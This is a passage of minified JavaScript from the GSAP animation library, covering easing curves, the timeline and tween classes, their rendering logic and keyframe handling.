          for (var e, i, n, r = {}, s = t.substr(1, t.length - 3).split(":"), o = s[0], a = 1, l = s.length; a < l; a++) i = s[a], e = a !== l - 1 ? i.lastIndexOf(",") : i.length, n = i.substr(0, e), r[o] = isNaN(n) ? n.replace(Ce, "").trim() : +n, o = i.substr(e + 1).trim();
          return r
        },
        Pe = function (t) {
          return function (e) {
            return 1 - t(1 - e)
          }
        },
        Le = function t(e, i) {
          for (var n, r = e._first; r;) r instanceof He ? t(r, i) : !r.vars.yoyoEase || r._yoyo && r._repeat || r._yoyo === i || (r.timeline ? t(r.timeline, i) : (n = r._ease, r._ease = r._yEase, r._yEase = n, r._yoyo = i)), r = r._next
        },
        Re = function (t, e) {
          return t && (P(t) ? t : Oe[t] || function (t) {
            var e, i, n, r, s = (t + "").split("("),
              o = Oe[s[0]];
            return o && s.length > 1 && o.config ? o.config.apply(null, ~t.indexOf("{") ? [De(s[1])] : (e = t, i = e.indexOf("(") + 1, n = e.indexOf(")"), r = e.indexOf("(", i), e.substring(i, ~r && r < n ? e.indexOf(")", n + 1) : n)).split(",").map(xt)) : Oe._CE && Ae.test(t) ? Oe._CE("", t) : o
          }(t)) || e
        },
        Be = function (t, e, i, n) {
          void 0 === i && (i = function (t) {
            return 1 - e(1 - t)
          }), void 0 === n && (n = function (t) {
            return t < .5 ? e(2 * t) / 2 : 1 - e(2 * (1 - t)) / 2
          });
          var r, s = {
            easeIn: e,
            easeOut: i,
            easeInOut: n
          };
          return mt(t, (function (t) {
            for (var e in Oe[t] = G[t] = s, Oe[r = t.toLowerCase()] = i, s) Oe[r + ("easeIn" === e ? ".in" : "easeOut" === e ? ".out" : ".inOut")] = Oe[t + "." + e] = s[e]
          })), s
        },
        Ie = function (t) {
          return function (e) {
            return e < .5 ? (1 - t(1 - 2 * e)) / 2 : .5 + t(2 * (e - .5)) / 2
          }
        },
        ze = function t(e, i, n) {
          var r = i >= 1 ? i : 1,
            s = (n || (e ? .3 : .45)) / (i < 1 ? i : 1),
            o = s / k * (Math.asin(1 / r) || 0),
            a = function (t) {
              return 1 === t ? 1 : r * Math.pow(2, -10 * t) * C((t - o) * s) + 1
            },
            l = "out" === e ? a : "in" === e ? function (t) {
              return 1 - a(1 - t)
            } : Ie(a);
          return s = k / s, l.config = function (i, n) {
            return t(e, i, n)
          }, l
        },
        Ye = function t(e, i) {
          void 0 === i && (i = 1.70158);
          var n = function (t) {
              return t ? --t * t * ((i + 1) * t + i) + 1 : 0
            },
            r = "out" === e ? n : "in" === e ? function (t) {
              return 1 - n(1 - t)
            } : Ie(n);
          return r.config = function (i) {
            return t(e, i)
          }, r
        };
      mt("Linear,Quad,Cubic,Quart,Quint,Strong", (function (t, e) {
        var i = e < 5 ? e + 1 : e;
        Be(t + ",Power" + (i - 1), e ? function (t) {
          return Math.pow(t, i)
        } : function (t) {
          return t
        }, (function (t) {
          return 1 - Math.pow(1 - t, i)
        }), (function (t) {
          return t < .5 ? Math.pow(2 * t, i) / 2 : 1 - Math.pow(2 * (1 - t), i) / 2
        }))
      })), Oe.Linear.easeNone = Oe.none = Oe.Linear.easeIn, Be("Elastic", ze("in"), ze("out"), ze()), g = 7.5625, _ = 1 / (y = 2.75), Be("Bounce", (function (t) {
        return 1 - b(1 - t)
      }), b = function (t) {
        return t < _ ? g * t * t : t < .7272727272727273 ? g * Math.pow(t - 1.5 / y, 2) + .75 : t < .9090909090909092 ? g * (t -= 2.25 / y) * t + .9375 : g * Math.pow(t - 2.625 / y, 2) + .984375
      }), Be("Expo", (function (t) {
        return t ? Math.pow(2, 10 * (t - 1)) : 0
      })), Be("Circ", (function (t) {
        return -(O(1 - t * t) - 1)
      })), Be("Sine", (function (t) {
        return 1 === t ? 1 : 1 - A(t * E)
      })), Be("Back", Ye("in"), Ye("out"), Ye()), Oe.SteppedEase = Oe.steps = G.SteppedEase = {
        config: function (t, e) {
          void 0 === t && (t = 1);
          var i = 1 / t,
            n = t + (e ? 0 : 1),
            r = e ? 1 : 0;
          return function (t) {
            return ((n * Jt(0, .99999999, t) | 0) + r) * i
          }
        }
      }, x.ease = Oe["quad.out"], mt("onComplete,onUpdate,onStart,onRepeat,onReverseComplete,onInterrupt", (function (t) {
        return ut += t + "," + t + "Params,"
      }));
      var Fe = function (t, e) {
          this.id = M++, t._gsap = this, this.target = t, this.harness = e, this.get = e ? e.get : pt, this.set = e ? e.getSetter : ni
        },
        Xe = function () {
          function t(t) {
            this.vars = t, this._delay = +t.delay || 0, (this._repeat = t.repeat === 1 / 0 ? -2 : t.repeat || 0) && (this._rDelay = t.repeatDelay || 0, this._yoyo = !!t.yoyo || !!t.yoyoEase), this._ts = 1, Ut(this, +t.duration, 1, 1), this.data = t.data, l && (this._ctx = l, l.data.push(this)), v || Ee.wake()
          }
          var e = t.prototype;
          return e.delay = function (t) {
            return t || 0 === t ? (this.parent && this.parent.smoothChildTiming && this.startTime(this._start + t - this._delay), this._delay = t, this) : this._delay
          }, e.duration = function (t) {
            return arguments.length ? this.totalDuration(this._repeat > 0 ? t + (t + this._rDelay) * this._repeat : t) : this.totalDuration() && this._dur
          }, e.totalDuration = function (t) {
            return arguments.length ? (this._dirty = 0, Ut(this, this._repeat < 0 ? t : (t - this._repeat * this._rDelay) / (this._repeat + 1))) : this._tDur
          }, e.totalTime = function (t, e) {
            if (Me(), !arguments.length) return this._tTime;
            var i = this._dp;
            if (i && i.smoothChildTiming && this._ts) {
              for (Xt(this, t), !i._dp || i.parent || Ht(i, this); i && i.parent;) i.parent._time !== i._start + (i._ts >= 0 ? i._tTime / i._ts : (i.totalDuration() - i._tTime) / -i._ts) && i.totalTime(i._tTime, !0), i = i.parent;
              !this.parent && this._dp.autoRemoveChildren && (this._ts > 0 && t < this._tDur || this._ts < 0 && t > 0 || !this._tDur && !t) && jt(this._dp, this, this._start - this._delay)
            }
            return (this._tTime !== t || !this._dur && !e || this._initted && Math.abs(this._zTime) === S || !t && !this._initted && (this.add || this._ptLookup)) && (this._ts || (this._pTime = t), wt(this, t, e)), this
          }, e.time = function (t, e) {
            return arguments.length ? this.totalTime(Math.min(this.totalDuration(), t + It(this)) % (this._dur + this._rDelay) || (t ? this._dur : 0), e) : this._time
          }, e.totalProgress = function (t, e) {
            return arguments.length ? this.totalTime(this.totalDuration() * t, e) : this.totalDuration() ? Math.min(1, this._tTime / this._tDur) : this.ratio
          }, e.progress = function (t, e) {
            return arguments.length ? this.totalTime(this.duration() * (!this._yoyo || 1 & this.iteration() ? t : 1 - t) + It(this), e) : this.duration() ? Math.min(1, this._time / this._dur) : this.ratio
          }, e.iteration = function (t, e) {
            var i = this.duration() + this._rDelay;
            return arguments.length ? this.totalTime(this._time + (t - 1) * i, e) : this._repeat ? zt(this._tTime, i) + 1 : 1
          }, e.timeScale = function (t) {
            if (!arguments.length) return -1e-8 === this._rts ? 0 : this._rts;
            if (this._rts === t) return this;
            var e = this.parent && this._ts ? Yt(this.parent._time, this) : this._tTime;
            return this._rts = +t || 0, this._ts = this._ps || -1e-8 === t ? 0 : this._rts, this.totalTime(Jt(-this._delay, this._tDur, e), !0), Ft(this), Lt(this)
          }, e.paused = function (t) {
            return arguments.length ? (this._ps !== t && (this._ps = t, t ? (this._pTime = this._tTime || Math.max(-this._delay, this.rawTime()), this._ts = this._act = 0) : (Me(), this._ts = this._rts, this.totalTime(this.parent && !this.parent.smoothChildTiming ? this.rawTime() : this._tTime || this._pTime, 1 === this.progress() && Math.abs(this._zTime) !== S && (this._tTime -= S)))), this) : this._ps
          }, e.startTime = function (t) {
            if (arguments.length) {
              this._start = t;
              var e = this.parent || this._dp;
              return e && (e._sort || !this.parent) && jt(e, this, t - this._delay), this
            }
            return this._start
          }, e.endTime = function (t) {
            return this._start + (I(t) ? this.totalDuration() : this.duration()) / Math.abs(this._ts || 1)
          }, e.rawTime = function (t) {
            var e = this.parent || this._dp;
            return e ? t && (!this._ts || this._repeat && this._time && this.totalProgress() < 1) ? this._tTime % (this._dur + this._rDelay) : this._ts ? Yt(e.rawTime(t), this) : this._tTime : this._tTime
          }, e.revert = function (t) {
            void 0 === t && (t = nt);
            var e = a;
            return a = t, (this._initted || this._startAt) && (this.timeline && this.timeline.revert(t), this.totalTime(-.01, t.suppressEvents)), "nested" !== this.data && !1 !== t.kill && this.kill(), a = e, this
          }, e.globalTime = function (t) {
            for (var e = this, i = arguments.length ? t : e.rawTime(); e;) i = e._start + i / (e._ts || 1), e = e._dp;
            return !this.parent && this.vars.immediateRender ? -1 : i
          }, e.repeat = function (t) {
            return arguments.length ? (this._repeat = t === 1 / 0 ? -2 : t, Gt(this)) : -2 === this._repeat ? 1 / 0 : this._repeat
          }, e.repeatDelay = function (t) {
            if (arguments.length) {
              var e = this._time;
              return this._rDelay = t, Gt(this), e ? this.time(e) : this
            }
            return this._rDelay
          }, e.yoyo = function (t) {
            return arguments.length ? (this._yoyo = t, this) : this._yoyo
          }, e.seek = function (t, e) {
            return this.totalTime(Zt(this, t), I(e))
          }, e.restart = function (t, e) {
            return this.play().totalTime(t ? -this._delay : 0, I(e))
          }, e.play = function (t, e) {
            return null != t && this.seek(t, e), this.reversed(!1).paused(!1)
          }, e.reverse = function (t, e) {
            return null != t && this.seek(t || this.totalDuration(), e), this.reversed(!0).paused(!1)
          }, e.pause = function (t, e) {
            return null != t && this.seek(t, e), this.paused(!0)
          }, e.resume = function () {
            return this.paused(!1)
          }, e.reversed = function (t) {
            return arguments.length ? (!!t !== this.reversed() && this.timeScale(-this._rts || (t ? -1e-8 : 0)), this) : this._rts < 0
          }, e.invalidate = function () {
            return this._initted = this._act = 0, this._zTime = -1e-8, this
          }, e.isActive = function () {
            var t, e = this.parent || this._dp,
              i = this._start;
            return !(e && !(this._ts && this._initted && e.isActive() && (t = e.rawTime(!0)) >= i && t < this.endTime(!0) - S))
          }, e.eventCallback = function (t, e, i) {
            var n = this.vars;
            return arguments.length > 1 ? (e ? (n[t] = e, i && (n[t + "Params"] = i), "onUpdate" === t && (this._onUpdate = e)) : delete n[t], this) : n[t]
          }, e.then = function (t) {
            var e = this;
            return new Promise((function (i) {
              var n = P(t) ? t : Tt,
                r = function () {
                  var t = e.then;
                  e.then = null, P(n) && (n = n(e)) && (n.then || n === e) && (e.then = t), i(n), e.then = t
                };
              e._initted && 1 === e.totalProgress() && e._ts >= 0 || !e._tTime && e._ts < 0 ? r() : e._prom = r
            }))
          }, e.kill = function () {
            me(this)
          }, t
        }();
      St(Xe.prototype, {
        _time: 0,
        _start: 0,
        _end: 0,
        _tTime: 0,
        _tDur: 0,
        _dirty: 0,
        _repeat: 0,
        _yoyo: !1,
        parent: null,
        _initted: !1,
        _rDelay: 0,
        _ts: 1,
        _dp: 0,
        ratio: 0,
        _zTime: -1e-8,
        _prom: 0,
        _ps: !1,
        _rts: 1
      });
      var He = function (t) {
        function e(e, i) {
          var n;
          return void 0 === e && (e = {}), (n = t.call(this, e) || this).labels = {}, n.smoothChildTiming = !!e.smoothChildTiming, n.autoRemoveChildren = !!e.autoRemoveChildren, n._sort = I(e.sortChildren), c && jt(e.parent || c, r(n), i), e.reversed && n.reverse(), e.paused && n.paused(!0), e.scrollTrigger && Wt(r(n), e.scrollTrigger), n
        }
        s(e, t);
        var i = e.prototype;
        return i.to = function (t, e, i) {
          return Qt(0, arguments, this), this
        }, i.from = function (t, e, i) {
          return Qt(1, arguments, this), this
        }, i.fromTo = function (t, e, i, n) {
          return Qt(2, arguments, this), this
        }, i.set = function (t, e, i) {
          return e.duration = 0, e.parent = this, Ot(e).repeatDelay || (e.repeat = 0), e.immediateRender = !!e.immediateRender, new $e(t, e, Zt(this, i), 1), this
        }, i.call = function (t, e, i) {
          return jt(this, $e.delayedCall(0, t, e), i)
        }, i.staggerTo = function (t, e, i, n, r, s, o) {
          return i.duration = e, i.stagger = i.stagger || n, i.onComplete = s, i.onCompleteParams = o, i.parent = this, new $e(t, i, Zt(this, r)), this
        }, i.staggerFrom = function (t, e, i, n, r, s, o) {
          return i.runBackwards = 1, Ot(i).immediateRender = I(i.immediateRender), this.staggerTo(t, e, i, n, r, s, o)
        }, i.staggerFromTo = function (t, e, i, n, r, s, o, a) {
          return n.startAt = i, Ot(n).immediateRender = I(n.immediateRender), this.staggerTo(t, e, n, r, s, o, a)
        }, i.render = function (t, e, i) {
          var n, r, s, o, l, h, u, f, d, p, m, v, g = this._time,
            y = this._dirty ? this.totalDuration() : this._tDur,
            _ = this._dur,
            b = t <= 0 ? 0 : gt(t),
            w = this._zTime < 0 != t < 0 && (this._initted || !_);
          if (this !== c && b > y && t >= 0 && (b = y), b !== this._tTime || i || w) {
            if (g !== this._time && _ && (b += this._time - g, t += this._time - g), n = b, d = this._start, h = !(f = this._ts), w && (_ || (g = this._zTime), (t || !e) && (this._zTime = t)), this._repeat) {
              if (m = this._yoyo, l = _ + this._rDelay, this._repeat < -1 && t < 0) return this.totalTime(100 * l + t, e, i);
              if (n = gt(b % l), b === y ? (o = this._repeat, n = _) : ((o = ~~(b / l)) && o === b / l && (n = _, o--), n > _ && (n = _)), p = zt(this._tTime, l), !g && this._tTime && p !== o && (p = o), m && 1 & o && (n = _ - n, v = 1), o !== p && !this._lock) {
                var x = m && 1 & p,
                  T = x === (m && 1 & o);
                if (o < p && (x = !x), g = x ? 0 : _, this._lock = 1, this.render(g || (v ? 0 : gt(o * l)), e, !_)._lock = 0, this._tTime = b, !e && this.parent && pe(this, "onRepeat"), this.vars.repeatRefresh && !v && (this.invalidate()._lock = 1), g && g !== this._time || h !== !this._ts || this.vars.onRepeat && !this.parent && !this._act) return this;
                if (_ = this._dur, y = this._tDur, T && (this._lock = 2, g = x ? _ : -1e-4, this.render(g, !0), this.vars.repeatRefresh && !v && this.invalidate()), this._lock = 0, !this._ts && !h) return this;
                Le(this, v)
              }
            }
            if (this._hasPause && !this._forcing && this._lock < 2 && ((u = function (t, e, i) {
                var n;
                if (i > e)
                  for (n = t._first; n && n._start <= i;) {
                    if ("isPause" === n.data && n._start > e) return n;
                    n = n._next
                  } else
                    for (n = t._last; n && n._start >= i;) {
                      if ("isPause" === n.data && n._start < e) return n;
                      n = n._prev
                    }
              }(this, gt(g), gt(n))) && (b -= n - (n = u._start))), this._tTime = b, this._time = n, this._act = !f, this._initted || (this._onUpdate = this.vars.onUpdate, this._initted = 1, this._zTime = t, g = 0), !g && n && !e && (pe(this, "onStart"), this._tTime !== b)) return this;
            if (n >= g && t >= 0)
              for (r = this._first; r;) {
                if (s = r._next, (r._act || n >= r._start) && r._ts && u !== r) {
                  if (r.parent !== this) return this.render(t, e, i);
                  if (r.render(r._ts > 0 ? (n - r._start) * r._ts : (r._dirty ? r.totalDuration() : r._tDur) + (n - r._start) * r._ts, e, i), n !== this._time || !this._ts && !h) {
                    u = 0, s && (b += this._zTime = -1e-8);
                    break
                  }
                }
                r = s
              } else {
                r = this._last;
                for (var k = t < 0 ? t : n; r;) {
                  if (s = r._prev, (r._act || k <= r._end) && r._ts && u !== r) {
                    if (r.parent !== this) return this.render(t, e, i);
                    if (r.render(r._ts > 0 ? (k - r._start) * r._ts : (r._dirty ? r.totalDuration() : r._tDur) + (k - r._start) * r._ts, e, i || a && (r._initted || r._startAt)), n !== this._time || !this._ts && !h) {
                      u = 0, s && (b += this._zTime = k ? -1e-8 : S);
                      break
                    }
                  }
                  r = s
                }
              }
            if (u && !e && (this.pause(), u.render(n >= g ? 0 : -1e-8)._zTime = n >= g ? 1 : -1, this._ts)) return this._start = d, Ft(this), this.render(t, e, i);
            this._onUpdate && !e && pe(this, "onUpdate", !0), (b === y && this._tTime >= this.totalDuration() || !b && g) && (d !== this._start && Math.abs(f) === Math.abs(this._ts) || this._lock || ((t || !_) && (b === y && this._ts > 0 || !b && this._ts < 0) && Dt(this, 1), e || t < 0 && !g || !b && !g && y || (pe(this, b === y && t >= 0 ? "onComplete" : "onReverseComplete", !0), this._prom && !(b < y && this.timeScale() > 0) && this._prom())))
          }
          return this
        }, i.add = function (t, e) {
          var i = this;
          if (L(e) || (e = Zt(this, e, t)), !(t instanceof Xe)) {
            if (X(t)) return t.forEach((function (t) {
              return i.add(t, e)
            })), this;
            if (D(t)) return this.addLabel(t, e);
            if (!P(t)) return this;
            t = $e.delayedCall(0, t)
          }
          return this !== t ? jt(this, t, e) : this
        }, i.getChildren = function (t, e, i, n) {
          void 0 === t && (t = !0), void 0 === e && (e = !0), void 0 === i && (i = !0), void 0 === n && (n = -T);
          for (var r = [], s = this._first; s;) s._start >= n && (s instanceof $e ? e && r.push(s) : (i && r.push(s), t && r.push.apply(r, s.getChildren(!0, e, i)))), s = s._next;
          return r
        }, i.getById = function (t) {
          for (var e = this.getChildren(1, 1, 1), i = e.length; i--;)
            if (e[i].vars.id === t) return e[i]
        }, i.remove = function (t) {
          return D(t) ? this.removeLabel(t) : P(t) ? this.killTweensOf(t) : (Ct(this, t), t === this._recent && (this._recent = this._last), Pt(this))
        }, i.totalTime = function (e, i) {
          return arguments.length ? (this._forcing = 1, !this._dp && this._ts && (this._start = gt(Ee.time - (this._ts > 0 ? e / this._ts : (this.totalDuration() - e) / -this._ts))), t.prototype.totalTime.call(this, e, i), this._forcing = 0, this) : this._tTime
        }, i.addLabel = function (t, e) {
          return this.labels[t] = Zt(this, e), this
        }, i.removeLabel = function (t) {
          return delete this.labels[t], this
        }, i.addPause = function (t, e, i) {
          var n = $e.delayedCall(0, e || tt, i);
          return n.data = "isPause", this._hasPause = 1, jt(this, n, Zt(this, t))
        }, i.removePause = function (t) {
          var e = this._first;
          for (t = Zt(this, t); e;) e._start === t && "isPause" === e.data && Dt(e), e = e._next
        }, i.killTweensOf = function (t, e, i) {
          for (var n = this.getTweensOf(t, i), r = n.length; r--;) je !== n[r] && n[r].kill(t, e);
          return this
        }, i.getTweensOf = function (t, e) {
          for (var i, n = [], r = ne(t), s = this._first, o = L(e); s;) s instanceof $e ? _t(s._targets, r) && (o ? (!je || s._initted && s._ts) && s.globalTime(0) <= e && s.globalTime(s.totalDuration()) > e : !e || s.isActive()) && n.push(s) : (i = s.getTweensOf(r, e)).length && n.push.apply(n, i), s = s._next;
          return n
        }, i.tweenTo = function (t, e) {
          e = e || {};
          var i, n = this,
            r = Zt(n, t),
            s = e,
            o = s.startAt,
            a = s.onStart,
            l = s.onStartParams,
            c = s.immediateRender,
            h = $e.to(n, St({
              ease: e.ease || "none",
              lazy: !1,
              immediateRender: !1,
              time: r,
              overwrite: "auto",
              duration: e.duration || Math.abs((r - (o && "time" in o ? o.time : n._time)) / n.timeScale()) || S,
              onStart: function () {
                if (n.pause(), !i) {
                  var t = e.duration || Math.abs((r - (o && "time" in o ? o.time : n._time)) / n.timeScale());
                  h._dur !== t && Ut(h, t, 0, 1).render(h._time, !0, !0), i = 1
                }
                a && a.apply(h, l || [])
              }
            }, e));
          return c ? h.render(0) : h
        }, i.tweenFromTo = function (t, e, i) {
          return this.tweenTo(e, St({
            startAt: {
              time: Zt(this, t)
            }
          }, i))
        }, i.recent = function () {
          return this._recent
        }, i.nextLabel = function (t) {
          return void 0 === t && (t = this._time), de(this, Zt(this, t))
        }, i.previousLabel = function (t) {
          return void 0 === t && (t = this._time), de(this, Zt(this, t), 1)
        }, i.currentLabel = function (t) {
          return arguments.length ? this.seek(t, !0) : this.previousLabel(this._time + S)
        }, i.shiftChildren = function (t, e, i) {
          void 0 === i && (i = 0);
          for (var n, r = this._first, s = this.labels; r;) r._start >= i && (r._start += t, r._end += t), r = r._next;
          if (e)
            for (n in s) s[n] >= i && (s[n] += t);
          return Pt(this)
        }, i.invalidate = function (e) {
          var i = this._first;
          for (this._lock = 0; i;) i.invalidate(e), i = i._next;
          return t.prototype.invalidate.call(this, e)
        }, i.clear = function (t) {
          void 0 === t && (t = !0);
          for (var e, i = this._first; i;) e = i._next, this.remove(i), i = e;
          return this._dp && (this._time = this._tTime = this._pTime = 0), t && (this.labels = {}), Pt(this)
        }, i.totalDuration = function (t) {
          var e, i, n, r = 0,
            s = this,
            o = s._last,
            a = T;
          if (arguments.length) return s.timeScale((s._repeat < 0 ? s.duration() : s.totalDuration()) / (s.reversed() ? -t : t));
          if (s._dirty) {
            for (n = s.parent; o;) e = o._prev, o._dirty && o.totalDuration(), (i = o._start) > a && s._sort && o._ts && !s._lock ? (s._lock = 1, jt(s, o, i - o._delay, 1)._lock = 0) : a = i, i < 0 && o._ts && (r -= i, (!n && !s._dp || n && n.smoothChildTiming) && (s._start += i / s._ts, s._time -= i, s._tTime -= i), s.shiftChildren(-i, !1, -1 / 0), a = 0), o._end > r && o._ts && (r = o._end), o = e;
            Ut(s, s === c && s._time > r ? s._time : r, 1, 1), s._dirty = 0
          }
          return s._tDur
        }, e.updateRoot = function (t) {
          if (c._ts && (wt(c, Yt(t, c)), p = Ee.frame), Ee.frame >= ct) {
            ct += w.autoSleep || 120;
            var e = c._first;
            if ((!e || !e._ts) && w.autoSleep && Ee._listeners.length < 2) {
              for (; e && !e._ts;) e = e._next;
              e || Ee.sleep()
            }
          }
        }, e
      }(Xe);
      St(He.prototype, {
        _lock: 0,
        _hasPause: 0,
        _forcing: 0
      });
      var je, We, Ve = function (t, e, i, n, r, s, o) {
          var a, l, c, h, u, f, d, p, m = new fi(this._pt, t, e, 0, 1, oi, null, r),
            v = 0,
            g = 0;
          for (m.b = i, m.e = n, i += "", (d = ~(n += "").indexOf("random(")) && (n = ue(n)), s && (s(p = [i, n], t, e), i = p[0], n = p[1]), l = i.match(V) || []; a = V.exec(n);) h = a[0], u = n.substring(v, a.index), c ? c = (c + 1) % 5 : "rgba(" === u.substr(-5) && (c = 1), h !== l[g++] && (f = parseFloat(l[g - 1]) || 0, m._pt = {
            _next: m._pt,
            p: u || 1 === g ? u : ",",
            s: f,
            c: "=" === h.charAt(1) ? yt(f, h) - f : parseFloat(h) - f,
            m: c && c < 4 ? Math.round : 0
          }, v = V.lastIndex);
          return m.c = v < n.length ? n.substring(v, n.length) : "", m.fp = o, (N.test(n) || d) && (m.e = 0), this._pt = m, m
        },
        Ne = function (t, e, i, n, r, s, o, a, l, c) {
          P(n) && (n = n(r || 0, t, s));
          var h, u = t[e],
            f = "get" !== i ? i : P(u) ? l ? t[e.indexOf("set") || !P(t["get" + e.substr(3)]) ? e : "get" + e.substr(3)](l) : t[e]() : u,
            d = P(u) ? l ? ei : ti : Je;
          if (D(n) && (~n.indexOf("random(") && (n = ue(n)), "=" === n.charAt(1) && ((h = yt(f, n) + (te(f) || 0)) || 0 === h) && (n = h)), !c || f !== n || We) return isNaN(f * n) || "" === n ? (!u && !(e in t) && Q(e, n), Ve.call(this, t, e, f, n, d, a || w.stringFilter, l)) : (h = new fi(this._pt, t, e, +f || 0, n - (f || 0), "boolean" == typeof u ? si : ri, 0, d), l && (h.fp = l), o && h.modifier(o, this, t), this._pt = h)
        },
        qe = function (t, e, i, n, r, s) {
          var o, a, l, c;
          if (at[t] && !1 !== (o = new at[t]).init(r, o.rawVars ? e[t] : function (t, e, i, n, r) {
              if (P(t) && (t = Ke(t, r, e, i, n)), !B(t) || t.style && t.nodeType || X(t) || F(t)) return D(t) ? Ke(t, r, e, i, n) : t;
              var s, o = {};
              for (s in t) o[s] = Ke(t[s], r, e, i, n);
              return o
            }(e[t], n, r, s, i), i, n, s) && (i._pt = a = new fi(i._pt, r, t, 0, 1, o.render, o, 0, o.priority), i !== m))
            for (l = i._ptLookup[i._targets.indexOf(r)], c = o._props.length; c--;) l[o._props[c]] = a;
          return o
        },
        Ue = function t(e, i, n) {
          var r, s, l, h, u, f, d, p, m, v, g, y, _, b = e.vars,
            w = b.ease,
            k = b.startAt,
            E = b.immediateRender,
            M = b.lazy,
            O = b.onUpdate,
            A = b.onUpdateParams,
            C = b.callbackScope,
            D = b.runBackwards,
            P = b.yoyoEase,
            L = b.keyframes,
            R = b.autoRevert,
            B = e._dur,
            z = e._startAt,
            Y = e._targets,
            F = e.parent,
            X = F && "nested" === F.data ? F.vars.targets : Y,
            H = "auto" === e._overwrite && !o,
            j = e.timeline;
          if (j && (!L || !w) && (w = "none"), e._ease = Re(w, x.ease), e._yEase = P ? Pe(Re(!0 === P ? w : P, x.ease)) : 0, P && e._yoyo && !e._repeat && (P = e._yEase, e._yEase = e._ease, e._ease = P), e._from = !j && !!b.runBackwards, !j || L && !b.stagger) {
            if (y = (p = Y[0] ? dt(Y[0]).harness : 0) && b[p.prop], r = Mt(b, rt), z && (z._zTime < 0 && z.progress(1), i < 0 && D && E && !R ? z.render(-1, !0) : z.revert(D && B ? it : et), z._lazy = 0), k) {
              if (Dt(e._startAt = $e.set(Y, St({
                  data: "isStart",
                  overwrite: !1,
                  parent: F,
                  immediateRender: !0,
                  lazy: I(M),
                  startAt: null,
                  delay: 0,
                  onUpdate: O,
                  onUpdateParams: A,
                  callbackScope: C,
                  stagger: 0
                }, k))), e._startAt._dp = 0, i < 0 && (a || !E && !R) && e._startAt.revert(it), E && B && i <= 0 && n <= 0) return void(i && (e._zTime = i))
            } else if (D && B && !z)
              if (i && (E = !1), l = St({
                  overwrite: !1,
                  data: "isFromStart",
                  lazy: E && I(M),
                  immediateRender: E,
                  stagger: 0,
                  parent: F
                }, r), y && (l[p.prop] = y), Dt(e._startAt = $e.set(Y, l)), e._startAt._dp = 0, i < 0 && (a ? e._startAt.revert(it) : e._startAt.render(-1, !0)), e._zTime = i, E) {
                if (!i) return
              } else t(e._startAt, S, S);
            for (e._pt = e._ptCache = 0, M = B && I(M) || M && !B, s = 0; s < Y.length; s++) {
              if (d = (u = Y[s])._gsap || ft(Y)[s]._gsap, e._ptLookup[s] = v = {}, ot[d.id] && st.length && bt(), g = X === Y ? s : X.indexOf(u), p && !1 !== (m = new p).init(u, y || r, e, g, X) && (e._pt = h = new fi(e._pt, u, m.name, 0, 1, m.render, m, 0, m.priority), m._props.forEach((function (t) {
                  v[t] = h
                })), m.priority && (f = 1)), !p || y)
                for (l in r) at[l] && (m = qe(l, r, e, g, u, X)) ? m.priority && (f = 1) : v[l] = h = Ne.call(e, u, l, "get", r[l], g, X, 0, b.stringFilter);
              e._op && e._op[s] && e.kill(u, e._op[s]), H && e._pt && (je = e, c.killTweensOf(u, v, e.globalTime(i)), _ = !e.parent, je = 0), e._pt && M && (ot[d.id] = 1)
            }
            f && ui(e), e._onInit && e._onInit(e)
          }
          e._onUpdate = O, e._initted = (!e._op || e._pt) && !_, L && i <= 0 && j.render(T, !0, !0)
        },
        Ge = function (t, e, i, n) {
          var r, s, o = e.ease || n || "power1.inOut";
          if (X(e)) s = i[t] || (i[t] = []), e.forEach((function (t, i) {
            return s.push({
              t: i / (e.length - 1) * 100,
              v: t,
              e: o
            })
          }));
          else
            for (r in e) s = i[r] || (i[r] = []), "ease" === r || s.push({
              t: parseFloat(t),
              v: e[r],
              e: o
            })
        },
        Ke = function (t, e, i, n, r) {
          return P(t) ? t.call(e, i, n, r) : D(t) && ~t.indexOf("random(") ? ue(t) : t
        },
        Ze = ut + "repeat,repeatDelay,yoyo,repeatRefresh,yoyoEase,autoRevert",
        Qe = {};
      mt(Ze + ",id,stagger,delay,duration,paused,scrollTrigger", (function (t) {
        return Qe[t] = 1
      }));
      var $e = function (t) {
        function e(e, i, n, s) {
          var a;
          "number" == typeof i && (n.duration = i, i = n, n = null);
          var l, h, u, f, d, p, m, v, g = (a = t.call(this, s ? i : Ot(i)) || this).vars,
            y = g.duration,
            _ = g.delay,
            b = g.immediateRender,
            x = g.stagger,
            T = g.overwrite,
            S = g.keyframes,
            k = g.defaults,
            E = g.scrollTrigger,
            M = g.yoyoEase,
            O = i.parent || c,
            A = (X(e) || F(e) ? L(e[0]) : "length" in i) ? [e] : ne(e);
          if (a._targets = A.length ? ft(A) : $("GSAP target " + e + " not found. https://greensock.com", !w.nullTargetWarn) || [], a._ptLookup = [], a._overwrite = T, S || x || Y(y) || Y(_)) {
            if (i = a.vars, (l = a.timeline = new He({
                data: "nested",
                defaults: k || {},
                targets: O && "nested" === O.data ? O.vars.targets : A
              })).kill(), l.parent = l._dp = r(a), l._start = 0, x || Y(y) || Y(_)) {
              if (f = A.length, m = x && oe(x), B(x))
                for (d in x) ~Ze.indexOf(d) && (v || (v = {}), v[d] = x[d]);
              for (h = 0; h < f; h++)(u = Mt(i, Qe)).stagger = 0, M && (u.yoyoEase = M), v && kt(u, v), p = A[h], u.duration = +Ke(y, r(a), h, p, A), u.delay = (+Ke(_, r(a), h, p, A) || 0) - a._delay, !x && 1 === f && u.delay && (a._delay = _ = u.delay, a._start += _, u.delay = 0), l.to(p, u, m ? m(h, p, A) : 0), l._ease = Oe.none;
              l.duration() ? y = _ = 0 : a.timeline = 0
            } else if (S) {
              Ot(St(l.vars.defaults, {
                ease: "none"
              })), l._ease = Re(S.ease || i.ease || "none");
              var C, D, P, R = 0;
              if (X(S)) S.forEach((function (t) {
                return l.to(A, t, ">")
              })), l.duration();
              else {
                for (d in u = {}, S) "ease" === d || "easeEach" === d || Ge(d, S[d], u, S.easeEach);
                for (d in u)
                  for (C = u[d].sort((function (t, e) {
                      return t.t - e.t
                    })), R = 0, h = 0; h < C.length; h++)(P = {
                    ease: (D = C[h]).e,
                    duration: (D.t - (h ? C[h - 1].t : 0)) / 100 * y
                  })[d] = D.v, l.to(A, P, R), R += P.duration;
                l.duration() < y && l.to({}, {
                  duration: y - l.duration()
                })
              }
            }
            y || a.duration(y = l.duration())
          } else a.timeline = 0;
          return !0 !== T || o || (je = r(a), c.killTweensOf(A), je = 0), jt(O, r(a), n), i.reversed && a.reverse(), i.paused && a.paused(!0), (b || !y && !S && a._start === gt(O._time) && I(b) && Bt(r(a)) && "nested" !== O.data) && (a._tTime = -1e-8, a.render(Math.max(0, -_) || 0)), E && Wt(r(a), E), a
        }
